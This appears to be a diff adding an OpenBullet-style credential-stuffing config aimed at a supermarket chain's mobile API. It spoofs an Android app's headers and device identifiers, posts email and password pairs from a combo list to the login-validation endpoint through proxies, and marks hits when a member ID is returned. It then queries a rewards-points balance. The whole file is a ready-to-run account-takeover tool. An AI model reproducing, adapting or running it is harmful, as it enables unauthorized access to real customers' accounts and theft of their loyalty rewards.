@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "Harveys",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T18:13:52.0411965+03:00",
+  "AdditionalInfo": "Made by Baws#5485",
+  "Author": "Dan",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://dmapi.biloholdings.com/dmapi/v2_0_0/initApp?tid=2d9272a882764651_6&macAddress=2d9272a882764651&deviceToken=b52506f9-2074-4c52-9aaa-c68ff879c266&operatingSystem=android" 
+  
+  HEADER "User-Agent: Appcelerator Titanium/7.0.2 (SM-G928F; Android API Level: 24; ro-RO;)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Accept-Encoding: identity" 
+  HEADER "VND.biloholdings.com.AppId: 021010" 
+  HEADER "VND.biloholdings.com.AppVersion: 2.0.0" 
+  HEADER "X-Titanium-Id: b52506f9-2074-4c52-9aaa-c68ff879c266" 
+PARSE "<SOURCE>" LR "guid\":\"" "\"" -> VAR "GUID" 
+REQUEST POST "https://dmapi.biloholdings.com/dmapi/v2_0_0/Customer/ValidatePassword?tid=2d9272a882764651_7" 
+  CONTENT "{\"Alias\":\"<USER>\",\"AliasType\":4,\"PinPassword\":\"<PASS>\",\"Source\":\"mobile\",\"DeviceId\":\"<GUID>\",\"AppCode\":\"021010\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Appcelerator Titanium/7.0.2 (SM-G928F; Android API Level: 24; ro-RO;)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Titanium-Id: b52506f9-2074-4c52-9aaa-c68ff879c266" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Request-Context: appId=cid-v1:737113cb-80e0-406b-898e-6980abb16bf4" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "User not found" 
+  KEYCHAIN Success OR 
+    KEY "MemberId\":" 
+REQUEST POST "https://dmapi.biloholdings.com/ExcentusServiceWebAPI/BalancesByCard?cardNumber=48302407739&rewardType=POINTS" 
+  
+  HEADER "User-Agent: Appcelerator Titanium/7.0.2 (SM-G928F; Android API Level: 24; ro-RO;)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Accept-Encoding: identity" 
+  HEADER "VND.biloholdings.com.AppId: 021010" 
+  HEADER "VND.biloholdings.com.AppVersion: 2.0.0" 
+  HEADER "X-Titanium-Id: b52506f9-2074-4c52-9aaa-c68ff879c266" 
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Invalid Card Number or RetailerUdk" 
+    KEY "rewardBalance\": null" 
